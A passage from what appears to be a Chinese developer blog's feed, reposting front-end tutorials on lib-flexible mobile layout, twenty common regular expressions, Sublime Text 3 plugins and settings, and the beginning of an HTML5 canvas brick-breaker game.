src=&quot;build/flexible_css.debug.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;build/flexible.debug.js&quot;&gt;&lt;/script&gt; 或者直接加载阿里CDN的文件： &lt;script src=&quot;http://g.tbcdn.cn/mtb/lib-flexible/0.3.4/??flexible_css.js,flexible.js&quot;&gt;&lt;/script&gt; 另外强烈建议对JS做内联处理，在所有资源加载之前执行这个JS。执行这个JS后，会在&lt;html&gt;元素上增加一个data-dpr属性，以及一个font-size样式。JS会根据不同的设备添加不同的data-dpr值，比如说2或者3，同时会给html加上对应的font-size的值，比如说75px。如此一来，页面中的元素，都可以通过rem单位来设置。他们会根据html元素的font-size值做相应的计算，从而实现屏幕的适配效果。此之外，在引入lib-flexible需要执行的JS之前，可以手动设置meta来控制dpr值，如： &lt;meta name=&quot;flexible&quot; content=&quot;initial-dpr=2&quot; /&gt; 其中initial-dpr会把dpr强制设置为给定的值。如果手动设置了dpr之后，不管设备是多少的dpr，都会强制认为其dpr是你设置的值。在此不建议手动强制设置dpr，因为在Flexible中，只对iOS设备进行dpr的判断，对于Android系列，始终认为其dpr为1。 if (!dpr &amp;&amp; !scale) { var isAndroid = win.navigator.appVersion.match(/android/gi); var isIPhone = win.navigator.appVersion.match(/iphone/gi); var devicePixelRatio = win.devicePixelRatio; if (isIPhone) { // iOS下，对于2和3的屏，用2倍的方案，其余的用1倍方案 if (devicePixelRatio &gt;= 3 &amp;&amp; (!dpr || dpr &gt;= 3)) { dpr = 3; } else if (devicePixelRatio &gt;= 2 &amp;&amp; (!dpr || dpr &gt;= 2)){ dpr = 2; } else { dpr = 1; } } else { // 其他设备下，仍旧使用1倍的方案 dpr = 1; } scale = 1 / dpr; } flexible的实质flexible实际上就是能过JS来动态改写meta标签，代码类似这样： var metaEl = doc.createElement(&apos;meta&apos;); var scale = isRetina ? 0.5:1; metaEl.setAttribute(&apos;name&apos;, &apos;viewport&apos;); metaEl.setAttribute(&apos;content&apos;, &apos;initial-scale=&apos; + scale + &apos;, maximum-scale=&apos; + scale + &apos;, minimum-scale=&apos; + scale + &apos;, user-scalable=no&apos;); if (docEl.firstElementChild) { document.documentElement.firstElementChild.appendChild(metaEl); } else { var wrap = doc.createElement(&apos;div&apos;); wrap.appendChild(metaEl); documen.write(wrap.innerHTML); } 事实上他做了这几样事情： 动态改写标签 给&lt;html&gt;元素添加data-dpr属性，并且动态改写data-dpr的值 给&lt;html&gt;元素添加font-size属性，并且动态改写font-size的值 案例实战 了解Flexible相关的知识之后，咱们回到文章开头。我们的目标是制作一个适配各终端的H5页面。别的不多说，动手才能丰衣足食。 创建HTML模板&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta content=&quot;yes&quot; name=&quot;apple-mobile-web-app-capable&quot;&gt; &lt;meta content=&quot;yes&quot; name=&quot;apple-touch-fullscreen&quot;&gt; &lt;meta content=&quot;telephone=no,email=no&quot; name=&quot;format-detection&quot;&gt; &lt;script src=&quot;http://g.tbcdn.cn/mtb/lib-flexible/0.3.4/??flexible_css.js,flexible.js&quot;&gt;&lt;/script&gt; &lt;link rel=&quot;apple-touch-icon&quot; href=&quot;favicon.png&quot;&gt; &lt;link rel=&quot;Shortcut Icon&quot; href=&quot;favicon.png&quot; type=&quot;image/x-icon&quot;&gt; &lt;title&gt;再来一波&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- 页面结构写在这里 --&gt; &lt;/body&gt; &lt;/html&gt; 正如前面所介绍的一样，首先加载了Flexible所需的配置： &lt;script src=&quot;http://g.tbcdn.cn/mtb/lib-flexible/0.3.4/??flexible_css.js,flexible.js&quot;&gt;&lt;/script&gt; 这个时候可以根据设计的图需求，在HTML文档的&lt;body&gt;&lt;/body&gt;中添加对应的HTML结构，比如： &lt;div class=&quot;item-section&quot; data-repeat=&quot;sections&quot;&gt; &lt;div class=&quot;item-section_header&quot;&gt; &lt;h2&gt;&lt;img src=&quot;{brannerImag}&quot; alt=&quot;&quot;&gt;&lt;/h2&gt; &lt;/div&gt; &lt;ul&gt; &lt;li data-repeat=&quot;items&quot; class=&quot;flag&quot; role=&quot;link&quot; href=&quot;{itemLink}&quot;&gt; &lt;a class=&quot;figure flag-item&quot; href=&quot;{itemLink}&quot;&gt; &lt;img src=&quot;{imgSrc}&quot; alt=&quot;&quot;&gt; &lt;/a&gt; &lt;div class=&quot;figcaption flag-item&quot;&gt; &lt;div class=&quot;flag-title&quot;&gt;&lt;a href=&quot;{itemLink}&quot; title=&quot;&quot;&gt;{poductName}&lt;/a&gt;&lt;/div&gt; &lt;div class=&quot;flag-price&quot;&gt;&lt;span&gt;双11价&lt;/span&gt;&lt;strong&gt;¥{price}&lt;/strong&gt;&lt;small&gt;({preferential})&lt;/small&gt;&lt;/div&gt; &lt;div class=&quot;flag-type&quot;&gt;{activityType}&lt;/div&gt; &lt;a class=&quot;flag-btn&quot; href=&quot;{shopLink}&quot;&gt;{activeName}&lt;/a&gt; &lt;/div&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; 这仅是一个示例文档，大家可以根据自己风格写模板。为了能更好的测试页面，给其配置一点假数据： //define data var pageData = { sections:[{ &quot;brannerImag&quot;:&quot;http://xxx.cdn.com/B1PNLZKXXXXXaTXXXXXXXXXXXX-750-481.jpg&quot;, items:[{ &quot;itemLink&quot;: &quot;##&quot;, &quot;imgSrc&quot;: &quot;https://placeimg.com/350/350/people/grayscale&quot;, &quot;poductName&quot;:&quot;Carter&apos;s1年式灰色长袖连体衣包脚爬服全棉鲸鱼男婴儿童装115G093&quot;, &quot;price&quot;: &quot;299.06&quot;, &quot;preferential&quot;: &quot;满400减100&quot;, &quot;activityType&quot;: &quot;1小时内热卖5885件&quot;, &quot;shopLink&quot;:&quot;##&quot;, &quot;activeName&quot;: &quot;马上抢！&quot; } .... }] }] } 接下来的工作就是美化工作了。在写具体样式之前，有几个点需要先了解一下。 把视觉稿中的px转换成rem读到这里，大家应该都知道，我们接下来要做的事情，就是如何把视觉稿中的px转换成rem。在此花点时间解释一下。首先，目前日常工作当中，视觉设计师给到前端开发人员手中的视觉稿尺寸一般是基于640px、750px以及1125px宽度为准。甚至为什么？大家应该懂的（考虑Retina屏）。正如文章开头显示的示例设计稿，他就是一张以750px为基础设计的。那么问题来了，我们如何将设计稿中的各元素的px转换成rem。我厂的视觉设计师想得还是很周到的，会帮你把相关的信息在视觉稿上标注出来。目前Flexible会将视觉稿分成100份（主要为了以后能更好的兼容vh和vw），而每一份被称为一个单位a。同时1rem单位被认定为10a。针对我们这份视觉稿可以计算出： 1a = 7.5px 1rem = 75px 那么我们这个示例的稿子就分成了10a，也就是整个宽度为10rem，&lt;html&gt;对应的font-size为75px：这样一来，对于视觉稿上的元素尺寸换算，只需要原始的px值除以rem基准值即可。例如此例视觉稿中的图片，其尺寸是176px * 176px,转换成为2.346667rem * 2.346667rem。 如何快速计算在实际生产当中，如果每一次计算px转换rem，或许会觉得非常麻烦，或许直接影响大家平时的开发效率。为了能让大家更快进行转换，我们团队内的同学各施所长，为px转换rem写了各式各样的小工具。 CSSREMCSSREM是一个CSS的px值转rem值的Sublime Text3自动完成插件。这个插件是由@正霖编写。先来看看插件的效果：有关于CSSREM如何安装、配置教程可以点击这里查阅。 CSS处理器除了使用编辑器的插件之外，还可以使用CSS的处理器来帮助大家处理。比如说Sass、LESS以及PostCSS这样的处理器。我们简单来看两个示例。 Sass使用Sass的同学，可以使用Sass的函数、混合宏这些功能来实现： @function px2em($px, $base-font-size: 16px) { @if (unitless($px)) { @warn &quot;Assuming #{$px} to be in pixels, attempting to convert it into pixels for you&quot;; @return px2em($px + 0px); // That may fail. } @else if (unit($px) == em) { @return $px; } @return ($px / $base-font-size) * 1em; } 除了使用Sass函数外，还可以使用Sass的混合宏： @mixin px2rem($property,$px-values,$baseline-px:16px,$support-for-ie:false){ //Conver the baseline into rems $baseline-rem: $baseline-px / 1rem * 1; //Print the first line in pixel values @if $support-for-ie { #{$property}: $px-values; } //if there is only one (numeric) value, return the property/value line for it. @if type-of($px-values) == &quot;number&quot;{ #{$property}: $px-values / $baseline-rem; } @else { //Create an empty list that we can dump values into $rem-values:(); @each $value in $px-values{ // If the value is zero or not a number, return it @if $value == 0 or type-of($value) != &quot;number&quot;{ $rem-values: append($rem-values, $value / $baseline-rem); } } // Return the property and its list of converted values #{$property}: $rem-values; } } 有关于更多的介绍，可以点击这里进行了解。 PostCSS(px2rem)了Sass这样的CSS处理器这外，我们团队的@颂奇同学还开发了一款npm的工具px2rem。安装好px2rem之后，可以在项目中直接使用。也可以使用PostCSS。使用PostCSS插件postcss-px2rem： var gulp = require(&apos;gulp&apos;); var postcss = require(&apos;gulp-postcss&apos;); var px2rem = require(&apos;postcss-px2rem&apos;); gulp.task(&apos;default&apos;, function() { var processors = [px2rem({remUnit: 75})]; return gulp.src(&apos;./src/*.css&apos;) .pipe(postcss(processors)) .pipe(gulp.dest(&apos;./dest&apos;)); }); 除了在Gulp中配置外，还可以使用其他的配置方式，详细的介绍可以点击这里进行了解。配置完成之后，在实际使用时，你只要像下面这样使用： .selector { width: 150px; height: 64px; /*px*/ font-size: 28px; /*px*/ border: 1px solid #ddd; /*no*/ } px2rem处理之后将会变成： .selector { width: 2rem; border: 1px solid #ddd; } [data-dpr=&quot;1&quot;] .selector { height: 32px; font-size: 14px; } [data-dpr=&quot;2&quot;] .selector { height: 64px; font-size: 28px; } [data-dpr=&quot;3&quot;] .selector { height: 96px; font-size: 42px; } 在整个开发中有了这些工具之后，完全不用担心px值转rem值影响开发效率。 字号不使用rem前面大家都见证了如何使用rem来完成H5适配。那么文本又将如何处理适配。是不是也通过rem来做自动适配。显然，我们在iPhone3G和iPhone4的Retina屏下面，希望看到的文本字号是相同的。也就是说，我们不希望文本在Retina屏幕下变小，另外，我们希望在大屏手机上看到更多文本，以及，现在绝大多数的字体文件都自带一些点阵尺寸，通常是16px和24px，所以我们不希望出现13px和15px这样的奇葩尺寸。如此一来，就决定了在制作H5的页面中，rem并不适合用到段落文本上。所以在Flexible整个适配方案中，考虑文本还是使用px作为单位。只不过使用[data-dpr]属性来区分不同dpr下的文本字号大小。 div { width: 1rem; height: 0.4rem; font-size: 12px; // 默认写上dpr为1的fontSize } [data-dpr=&quot;2&quot;] div { font-size: 24px; } [data-dpr=&quot;3&quot;] div { font-size: 36px; } 为了能更好的利于开发，在实际开发中，我们可以定制一个font-dpr()这样的Sass混合宏： @mixin font-dpr($font-size){ font-size: $font-size; [data-dpr=&quot;2&quot;] &amp; { font-size: $font-size * 2; } [data-dpr=&quot;3&quot;] &amp; { font-size: $font-size * 3; } } 有了这样的混合宏之后，在开发中可以直接这样使用： @include font-dpr(16px); 当然这只是针对于描述性的文本，比如说段落文本。但有的时候文本的字号也需要分场景的，比如在项目中有一个slogan,业务方希望这个slogan能根据不同的终端适配。针对这样的场景，完全可以使用rem给slogan做计量单位。 CSS本来想把这个页面的用到的CSS(或SCSS)贴出来，但考虑篇幅过长，而且这么简单的页面，我想大家也能轻而易举搞定。所以就省略了。权当是给大家留的一个作业吧，感兴趣的可以试试Flexible能否帮你快速完成H5页面终端适配。 效果 最后来看看真机上显示的效果吧。我截了两种设备下的效果： iPhone4 iPhone6+ 总结 其实H5适配的方案有很多种，网上有关于这方面的教程也非常的多。不管哪种方法，都有其自己的优势和劣势。而本文主要介绍的是如何使用Flexible这样的一库来完成H5页面的终端适配。为什么推荐使用Flexible库来做H5页面的终端设备适配呢？主要因为这个库在手淘已经使用了近一年，而且已达到了较为稳定的状态。除此之外，你不需要考虑如何对元素进行折算，可以根据对应的视觉稿，直接切入。当然，如果您有更好的H5页面终端适配方案，欢迎在下面的评论中与我们一起分享。如果您在使用这个库时，碰到任何问题，都可以在Github给我们提Issue。我们团队会努力解决相关需Issues。 更新 学们反馈需要一个在线演示的DEMO。那么花了点时间写了个demo，希望对有需要的同学有所帮助。友情提示：DEMO未经过所有设备测试，可能在部分设备上有细节上的差异DEMO请用手机扫下面的二维码 更新【2016年01月13日】 首先，由衷的感谢@完颜 帮忙踩了这个坑，回想起iOS从7~8，从8~9，都踩过只至少一个坑，真的也是醉了。手淘这边的flexible方案临时升级如下： 针对OS 9_3的UA，做临时处理，强制dpr为1，即scale也为1，虽然牺牲了这些版本上的高清方案，但是也只能这么处理了 这个版本不打算发布到CDN（也不发不到tnpm），所以大家更新的方式，最好手动复制代码内联到html中，具体代码可以点击这里下载 转自：http://www.w3cplus.com/mobile/lib-flexible-for-html5-layout.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[知道这20个正则表达式，能让你少写1,000行代码🐰]]></title>
      <url>%2F2016%2F06%2F05%2F37%2F</url>
      <content type="text"><![CDATA[正则表达式，一个十分古老而又强大的文本处理工具，仅仅用一段非常简短的表达式语句，便能够快速实现一个非常复杂的业务逻辑。熟练地掌握正则表达式的话，能够使你的开发效率得到极大的提升。正则表达式经常被用于字段或任意字符串的校验，如下面这段校验基本日期格式的JavaScript代码： var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2})$/; var r = fieldValue.match(reg); if(r==null)alert(&apos;Date format error!&apos;); 下面是技匠整理的，在前端开发中经常使用到的20个正则表达式。 1 . 校验密码强度密码的强度必须是包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间。 ^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$ 2. 校验中文字符串仅能是中文。 ^[\\u4e00-\\u9fa5]{0,}$ 3. 由数字、26个英文字母或下划线组成的字符串^\\w+$ 4. 校验E-Mail 地址同密码一样，下面是E-mail地址合规性的正则检查语句。 [\\w!#$%&amp;&apos;*+/=?^_`{|}~-]+(?:\\.[\\w!#$%&amp;&apos;*+/=?^_`{|}~-]+)*@(?:[\\w](?:[\\w-]*[\\w])?\\.)+[\\w](?:[\\w-]*[\\w])? 5. 校验身份证号码下面是身份证号码的正则校验。15 或 18位。15位： ^[1-9]\\d{7}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}$ 18位： ^[1-9]\\d{5}[1-9]\\d{3}((0\\d)|(1[0-2]))(([0|1|2]\\d)|3[0-1])\\d{3}([0-9]|X)$ 6. 校验日期“yyyy-mm-dd“ 格式的日期校验，已考虑平闰年。 ^(?:(?!0000)[0-9]{4}-(?:(?:0[1-9]|1[0-2])-(?:0[1-9]|1[0-9]|2[0-8])|(?:0[13-9]|1[0-2])-(?:29|30)|(?:0[13578]|1[02])-31)|(?:[0-9]{2}(?:0[48]|[2468][048]|[13579][26])|(?:0[48]|[2468][048]|[13579][26])00)-02-29)$ 7. 校验金额金额校验，精确到2位小数。 ^[0-9]+(.[0-9]{2})?$ 8. 校验手机号下面是国内 13、15、18开头的手机号正则表达式。（可根据目前国内收集号扩展前两位开头号码） ^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\\d{8}$ 9. 判断IE的版本IE目前还没被完全取代，很多页面还是需要做版本兼容，下面是IE版本检查的表达式。 ^.*MSIE [5-8](?:\\.[0-9]+)?(?!.*Trident\\/[5-9]\\.0).*$ 10. 校验IP-v4地址IP4 正则语句。 \\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b 11. 校验IP-v6地址IP6 正则语句。 (([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])) 12. 检查URL的前缀应用开发中很多时候需要区分请求是HTTPS还是HTTP，通过下面的表达式可以取出一个url的前缀然后再逻辑判断。 if (!s.match(/^[a-zA-Z]+:\\/\\//)) { s = &apos;http://&apos; + s; } 13. 提取URL链接下面的这个表达式可以筛选出一段文本中的URL。 ^(f|ht){1}(tp|tps):\\/\\/([\\w-]+\\.)+[\\w-]+(\\/[\\w- ./?%&amp;=]*)? 14. 文件路径及扩展名校验验证windows下文件路径和扩展名（下面的例子中为.txt文件） ^([a-zA-Z]\\:|\\\\)\\\\([^\\\\]+\\\\)*[^\\/:*?&quot;&lt;&gt;|]+\\.txt(l)?$ 15. 提取Color Hex Codes有时需要抽取网页中的颜色代码，可以使用下面的表达式。 ^#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})$ 16. 提取网页图片假若你想提取网页中所有图片信息，可以利用下面的表达式。 \\&lt; *[img][^\\\\&gt;]*[src] *= *[\\&quot;\\&apos;]{0,1}([^\\&quot;\\&apos;\\ &gt;]*) 17. 提取页面超链接提取html中的超链接。 (&lt;a\\s*(?!.*\\brel=)[^&gt;]*)(href=&quot;https?:\\/\\/)((?!(?:(?:www\\.)?&apos;.implode(&apos;|(?:www\\.)?&apos;, $follow_list).&apos;))[^&quot;]+)&quot;((?!.*\\brel=)[^&gt;]*)(?:[^&gt;]*)&gt; 18. 查找CSS属性通过下面的表达式，可以搜索到相匹配的CSS属性。 ^\\s*[a-zA-Z\\-]+\\s*[:]{1}\\s[a-zA-Z0-9\\s.#]+[;]{1} 19. 抽取注释如果你需要移除HMTL中的注释，可以使用如下的表达式。 &lt;!--(.*?)--&gt; 20. 匹配HTML标签通过下面的表达式可以匹配出HTML中的标签属性。 &lt;\\/?\\w+((\\s+\\w+(\\s*=\\s*(?:&quot;.*?&quot;|&apos;.*?&apos;|[\\^&apos;&quot;&gt;\\s]+))?)+\\s*|\\s*)\\/?&gt; 正则表达式的相关语法下面是我找到的一张非常不错的正则表达式 Cheat Sheet，可以用来快速查找相关语法。 学习正则表达式我在网上看到了一篇相当不错的正则表达式快速学习指南.aspx)，有兴趣继续深入学习的同学可以参考。 正则表达式在线测试工具regex101是一个非常不错的正则表达式在线测试工具，你可以直接在线测试你的正则表达式哦。 另外，我也网上找到几本不错的正则表达式方面的教程和书籍，并将它们分享到了技匠社jijiangshe.com，如果你有兴趣学习欢迎访问获取。^_^ 转自：http://www.jianshu.com/p/e7bb97218946]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Sublime Text 3最好的功能、插件和设置🍰]]></title>
      <url>%2F2016%2F06%2F01%2F36%2F</url>
      <content type="text"><![CDATA[Features（功能） Command Palette （命令面板） ctrl + shift + p命令面板可以使你访问设置菜单中可以所有的东西，调用包命令，更改文件的语法，处理Sublime项目，等等。举例来说，你可以在命令面板中Git命令添加，分支，提交和推送。 使用：ctrl + shift + p File Switching （文件切换） ctrl + pSublime Text提供了一个非常快速的方式来打开新的文件。只要按下Ctrl+ P并开始输入你想要打开的文件的名称。一旦找到文件，只需按enter键，就可以开始直接输入到该文件了！ 使用：ctrl + p Goto Symbols （跳转标记） ctrl + r当你编辑一个大文件时，文件中有一堆方法，按Ctrl + R将其全部列出来，使他们更容易找到。开始尝试的输入你想要的，然后按Enter 就可以快速跳转这个方法了。 使用方法：按Ctrl+ R Sublime Text 3 有一个新功能（Goto Definition 转到定义）。它提供了 Sublime Text 更多功能，使其更接近于一个IDE。如果你有兴趣，可以自己去学习一下 Multi-Edit（多行编辑） ctrl + click在我看来这绝对是Sublime Text最好的功能。使用它之后，就很难再回到其他文本编辑器。（愚人码头注：其实很多编辑器，IDE现在都有这功能了，比如：WebStorm）有许多不同的方式使用多行编辑： ctrl + d: 选中光标所占的文本，继续操作则会选中下一个相同的文本。（愚人码头注：多按几下试试） ctrl + click: 单击想要编辑的每一个地方，都将创建一个光标 ctrl + shift + f 和 alt + enter: 在你的文件查找一个文本，然后将其全部选中 以下叔整理的: ctrl+l 选中整行，继续操作则继续选择下一行，效果和 shift+↓ 效果一样。 ctrl+shift+l 先选中多行，再按下快捷键，会在每行行尾插入光标，即可同时编辑这些行。 ctrl+alt+↑ 或 ctrl+alt+鼠标向上拖动 向上添加多行光标，可同时编辑多行。 ctrl+alt+↓ 或 ctrl+alt+鼠标向下拖动 向下添加多行光标，可同时编辑多行。 shift+↑ 向上选中多行。 shift+↓ 向下选中多行。 Snippets（代码片段）代码片段是Sublime Text的另一大特点。您可以使用预装的，也可以自己创建，或安装具有代码片段的包。你所要做的就是输入一个定义了代码片段的文本，它会扩展到你的代码段。例如，键入lorem将产生lorem存有文本。使用: 输入一个定义了代码片段的文本（例如lorem），然后按tab键。这里有一篇关于创建代码片段的非常棒的文章，http://www.hongkiat.com/blog/sublime-code-snippets/ Keyboard Shortcuts （快捷键）Sublime Text的快捷键的数量是惊人的。我觉得这是Sublime Text另一个好的功能。如果太多了，你可以将自己常用的快捷键从主键（ home keys ）移到了自己的快捷键列表中（my keyboard）。对于Sublime Text键盘快捷键的完整列表，看看我们的键盘快捷键文章。https://scotch.io/bar-talk/sublime-text-keyboard-shortcuts Projects（项目） 在Sublime Text中，项目是工作流程中不可或缺的一部分。一个项目仅仅是一个 Sublime工作空间，项目中的文件夹都是开放的，并显示在侧边栏中。这是很有帮助的，因为你可以定义一个项目，并添加文件夹到项目中，并能够迅速地在文件夹之间切换。使用项目，你只需要去Windows资源管理器或Finder中找到你想要的项目，并将其拖到Sublime Text，就可以了。保存一个项目：进入命令面板，输入保存项目。 切换项目：ctrl + alt + p Packages/Plugins（包/插件） Package Control（包控制）Sublime Text提供了绝对必要的包管理器。这是安装下面列出的所有插件和主题的最佳方式。继续，在包控制在安装插件。使用方法：进入命令面板（ctrl + shift+ p），然后键入 install。包控制将加载所有可用于安装的包。看看你可以查找并安装自己喜欢的包.. Alignment （代码对齐）一个非常简单和易于使用的插件,使你的代码组织和美观。当您重温代码时候非常有用。使用方法：选中要调整的行，然后按 Ctrl+ Alt + A BracketHighlighter该插件提供行数列高亮的各种配对的语法符号。（愚人码头注：就是将配对的括号等显示在行数列上） Colorpicker使用一个取色器改变颜色使用方法: ctrl + shift + c注：该插件在Mac上使用时非常漂亮 EmmetEmmet绝对的节省时间。您可以轻松快速地编写HTML。使用方法: ctrl + alt+ enter ,并且开始输入Emmet风格的HTML看看我们的Emmet指南，以了解更多，并自己尝试Emmet。 DocBlockr一个真正简单的方式来轻松地创建许多语言包括JavaScript，PHP和CoffeeScript的文档块。只要在函数的上面输入/**，按Tab就可以了。DocBlockr会观察函数需要的变量名和类型，并创建文档块。 GitGit帮助你与你的Git repo协议进行交互。它支持很多命令像init, push,pull, branch, stash,等的。了解更多关于你在Sublime Text里面究竟能使用哪些Git功能，以提高您的工作流程。https://scotch.io/tutorials/using-git-inside-of-sublime-text-to-improve-workflow GitGutter这是一个小巧有用的插件，它会告诉你自上次git commit以来已经改变的行。一个指示器显示在行号的旁边。 Gist这个插件可以让你拉你的Gists，并把它们插入到你的文件。当你有一个Gists，以启动一个HTML文件或任何其他可重用的代码时候，这是有用的。使用方法：打开命令面板，并且键入gist。您也可以使用所显示的快捷方式。 SidebarEnhancements在侧边栏的文件上右击时，这个插件提供了大量更多的选择。打开，查找，复制和粘贴，等等。这里是老菜单和SidebarEnhanced菜单的比较。 Themes （主题） Sublime Text可以安装主题，有一些主题真的很酷。您可以使用包控制找到这些。使用包控制安装一个主题，然后更新您的用户设置使用它。 // User/Preferences.sublime-settings { &quot;theme&quot;: &quot;Soda Light.sublime-theme&quot; } 注意： 您可能必须重新启动Sublime Text，这些更改才会生效。一些流行的主题：THEME – SODA 包括 LIGHT 和 DARKFlatland的一个分支。repo SPACEGRAY“一个Hyperminimal UI主题”。 Color Schemes (配色方案) 除了改变你的主题，你也可以改变你的配色方案。这不同于主题，因为主题是Sublime Text的包。配色方案仅仅是配色方案文件，并更改您的设置。更改配色方案：菜单，Preferences首选项&gt;Color Scheme配色方案，并选择一个。 Settings（设置） Sublime自带了大量的设置。我建议你去看看它所提供的所有设置。为了让您进入用户设置，使用命令面板并且键入user。这里是我当前的设置，大部分是属性不需要解释了吧。为自己挑选好的部分并作为自己的自定义设置! // User/Preferences.sublime-settings { &quot;bold_folder_labels&quot;: true, &quot;color_scheme&quot;: &quot;Packages/Theme - Flatland/Flatland Monokai.tmTheme&quot;, &quot;font_face&quot;: &quot;Ubuntu Mono&quot;, &quot;font_options&quot;: &quot;subpixel_antialias&quot;, &quot;font_size&quot;: 14, &quot;highlight_line&quot;: true, &quot;highlight_modified_tabs&quot;: true, &quot;ignored_packages&quot;: [ ], &quot;line_padding_bottom&quot;: 1, &quot;line_padding_top&quot;: 1, &quot;rulers&quot;: [ 80 ], &quot;scroll_past_end&quot;: true, &quot;tab_size&quot;: 4, &quot;tab_completion&quot;: false, &quot;theme&quot;: &quot;Soda Light.sublime-theme&quot;, &quot;translate_tabs_to_spaces&quot;: true, &quot;trim_trailing_white_space_on_save&quot;: true, &quot;vintage_start_in_command_mode&quot;: true, &quot;word_wrap&quot;: true } 我在Sublime中用的是最佳模式。它提供了 vi 编辑命令代替Sublime Text。它不是原vi包的全功能，但它是我目前见过最接近 vi编辑器的文本编辑器。使用你的键盘快捷键和命令包就可以非常快速的开发。上面的设置会在你打开一个文件时自动开启Vintage模式（叔注：Vintage是Sublime Text的vi模式编辑包。 可以使用组合vi命令来调用Sublime Text的功能，包括多重选择。）。如果你不喜欢这个功能，只是删除vintage_start_in_command_mode就可以了，如果你想完全禁用Vintage模式，那么删除ignored_packages设置。 Conclusion（结论） 我敢肯定，还有很多Sublime的优秀部分我错过或者遗漏了。你过你发现了任何其他非常棒的包或者插件、功能，欢迎留言告诉我，让我知道，大家一起快乐地编码！ 转自：http://www.css88.com/archives/5858]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[canvas🐸]]></title>
      <url>%2F2016%2F05%2F30%2F35%2F</url>
      <content type="text"><![CDATA[最近在学习HTML5，做了一个打砖块游戏。。。。以下是代码哦: &lt;!DOCUTYPE HTML&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt; 打砖块. by 一只柯楠 &lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; #zn{ border: 10px red solid; margin: 0 auto; display: block; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;打砖块&lt;/h1&gt; &lt;hr /&gt; 空格键：暂停;&lt;br /&gt; 方向左右键：控制接球板;&lt;br /&gt; &lt;canvas id=&quot;zn&quot; width=&quot;480&quot; height=&quot;760&quot;&gt;&lt;/canvas&gt; &lt;script type=&quot;text/javascript&quot;&gt; var Brick= function () { var requestAnim= window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function(callback) { return setTimeout(callback, 100/6); }, cancelAnim= window.cancelAnimationFrame || window.webkitCancelAnimationFrame || window.mozCancelAnimationFrame || window.oCancelAnimationFrame || window.msCancelAnimationFrame || function(timeid) { return clearTimeout(timeid); }, col= 8, row= 8, BW, BH= 30, BS= 1, r= 18, random= function (n1, n2) { return Math.round(Math.random()*(n2- n1))+n1}, elWidth, elHeight, cycle= 200, N= 0, score= 0, randColor= function(c1, c2){ return &apos;rgb(&apos;+ random(c1 || 0, c2 || 255)+ &apos;,&apos;+ random(c1 || 0, c2 || 255)+ &apos;,&apos;+ random(c1 || 0, c2 || 255)+ &apos;)&apos;} , init = function (id) { var el= this.el= document.querySelector(id); elWidth= el.width, elHeight= el.height; this.c= el.getContext(&apos;2d&apos;); BW= +(elWidth/col-BS).toFixed(2); this.RL= (elWidth- BW)/2; this.RT= elHeight- BH- BS; this.x= this.RL+ (BW/2); this.y= elHeight-r- BH- BS; this.xv= random(46, 90)* (Math.random()&gt; .5 ? 2 : -2); this.yv= -4* 126; this.initBricks(); //暂停 this.suspend= true; this.listenerEvent(); } init.prototype= { start: function (timestamp) { var self= this, newTime= Date.now(), diffX, diffY, diffTime= newTime- (timestamp || newTime) , x, y; if(++N=== cycle){ N= 0; var ary= []; this.tables.unshift(ary); for(var i =0 ; i&lt; col; i++){ ary.push(1); } } diffX= this.xv* diffTime/1000; diffY= this.yv* diffTime/1000; this.clearView(); //绘制砖块 this.drawBricks(); //绘制小球 this.drawBall(0, 0); //绘制接球板 this.drawRacket(); //绘制得分 this.showText(score); if(this.downKeyLeft) this.RL= Math.max(this.RL- BW/5, 0); else if(this.downKeyRight) this.RL= Math.min(this.RL+ BW/5, elWidth- 2*BW); x= this.x+ diffX; y= this.y+ diffY; if(x- r &lt;0 || x+ r &gt; elWidth) this.xv *= -1; if(y- r&lt; 0) this.yv *= -1; else if(y+ r&gt; this.RT){ if(x+ r&gt; this.RL &amp;&amp; x-r&lt; this.RL+ 2*BW) this.yv *= -1; else{ this.suspend= true ; this.clearView(); this.showText(&apos;GAME OVER&apos;); } } var i= Math.floor(x/(BW +BS)), j= Math.floor(y/(BH +BS)); if(this.tables[j] &amp;&amp; 